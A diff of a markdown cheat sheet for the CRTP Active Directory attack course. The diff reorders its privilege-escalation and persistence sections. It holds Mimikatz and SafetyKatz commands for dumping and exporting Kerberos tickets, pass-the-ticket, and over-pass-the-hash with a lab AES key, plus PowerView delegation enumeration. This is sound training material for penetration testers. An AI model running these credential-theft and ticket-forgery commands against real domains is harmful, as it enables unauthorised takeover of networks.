@@ -19,12 +19,13 @@ Command/tooling reference material useful for the CRTP course and Active Directo
     - [Windows CLI](#Windows-CLI)
     - [AD PowerShell Module](#Active-Directory-PowerShell-Module)
    - [Local Privilege Escalation](#Local-Privilege-Escalation) 
-   - [Domain Privilege Escalation](#Domain-Privilege-Escalation)
-     - [Unconstrained Delegation](#Unconstrained-Delegation)
-     - [Constrained Delegation](#Constrained-Delegation)
+   - [Domain Persistence](#Domain-Persistence)
      - [Golden Ticket](#Golden-Ticket)
      - [Silver Ticket](#Silver-Ticket)
      - [OverPass-the-Hash](#OverPass-the-Hash)
+   - [Domain Privilege Escalation](#Domain-Privilege-Escalation)
+     - [Unconstrained Delegation](#Unconstrained-Delegation)
+     - [Constrained Delegation](#Constrained-Delegation)
    - [Credential Access](#Credential-Access)
      - [Mimikatz](#Mimikatz)
    - [Lateral Movement](#Lateral-Movement)
@@ -235,32 +236,7 @@ Invoke-Privesc Check
 ```powershell 
 winPEASx64.exe
 ```
-## Domain Privilege Escalation
-### Unconstrained Delegation
-Delegation is the action of allowing a computer to save a user’s Kerberos authentication tickets, then use those tickets to impersonate the user and act on that user’s behalf.
-```powershell
-Check for unconstrained delegation with PowerView 
-Get-Netcomputer -UnConstrained
-Get-Netcomputer -UnConstrained | select samaccountname
-```
-Leverage Mimikatz to to check for DA tokens and export them. May have to wait for a login
-```powershell
-Invoke-Mimikatz -Command '"sekurlsa::tickets"'
-Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
-Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
-```
-### Constrained Delegation 
-Constrained delegation allows the account with the “Trust this user/computer for delegation to specified services only” enabled to impersonate ANY user to access specific services listed in the allowable delegation list.
-#### Enumerate Users
-```powershell
-Get-DomainUser -TrustedToAuth
-Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
-```
-#### Enumerate Computers
-```powershell
-Get-Domaincomputer -TrustedToAuth
-Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
-```
+## Domain Persistence 
 ### Golden Ticket
 With krbtgt creds, create a golden ticket for domain persistence
 ```powershell
@@ -294,6 +270,33 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
 ```
+## Domain Privilege Escalation
+### Unconstrained Delegation
+Delegation is the action of allowing a computer to save a user’s Kerberos authentication tickets, then use those tickets to impersonate the user and act on that user’s behalf.
+```powershell
+Check for unconstrained delegation with PowerView 
+Get-Netcomputer -UnConstrained
+Get-Netcomputer -UnConstrained | select samaccountname
+```
+Leverage Mimikatz to to check for DA tokens and export them. May have to wait for a login
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::tickets"'
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
+```
+### Constrained Delegation 
+Constrained delegation allows the account with the “Trust this user/computer for delegation to specified services only” enabled to impersonate ANY user to access specific services listed in the allowable delegation list.
+#### Enumerate Users
+```powershell
+Get-DomainUser -TrustedToAuth
+Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
+```
+#### Enumerate Computers
+```powershell
+Get-Domaincomputer -TrustedToAuth
+Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
+```
+
 ## Credential Access 
 I would recommend becoming familiar with different tooling that can be used to dump creds. 
 ### Mimikatz 
